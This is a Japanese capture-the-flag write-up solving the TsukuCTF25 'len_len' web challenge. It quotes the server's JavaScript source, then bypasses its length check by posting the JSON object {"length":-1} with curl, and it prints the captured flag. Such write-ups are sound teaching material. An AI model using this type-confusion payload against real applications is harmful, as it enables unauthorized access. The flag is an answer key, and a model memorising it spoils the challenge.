curl -X POST -d 'array={"length":-1}' http://challs.tsukuctf.org:28888


## len_len
### 問題文
"length".length is 6 ?  

curl http://challs.tsukuctf.org:28888

---

curlを叩いてみる。  
`curl http://challs.tsukuctf.org:28888`  


`How to use -> curl -X POST -d 'array=[1,2,3,4]' http://challs.tsukuctf.org:28888`  
使い方が違うようだ

`error: no flag for you. sanitized string is [1,2,3,4], length is 9`  
うーん。なんかarrayとして渡した値が何か関係しているようだ。  

ソースコードが配布されているので、ソースを読んでみる。

```js
function chall(str = "[1, 2, 3]") {
  const sanitized = str.replaceAll(" ", "");
  if (sanitized.length < 10) {
    return `error: no flag for you. sanitized string is ${sanitized}, length is ${sanitized.length.toString()}`;
  }
  const array = JSON.parse(sanitized);
  if (array.length < 0) {
    // hmm...??
    return FLAG;
  }
  return `error: no flag for you. array length is too long -> ${array.length}`;
}

app.post("/", (req, res) => {
  const array = req.body.array;
  res.send(chall(array));
});

```

どうやら、渡した配列の空白を除いた文字の長さが、10未満だとダメ。    
そして、JSON.parseしてできた配列の長さが0より大きいダメ。  
そもそも、lengthプロパティの値は、非負の整数なので、0未満の値が出てくることはない。  
たしか、JSのMapが map = {"key":"value"} のとき、map.keyで、返り値がvalueになったはず。  

試しに、array={"length":-1}としてみる。

`TsukuCTF25{l4n_l1n_lun_l4n_l0n}`
Flagがゲットできた。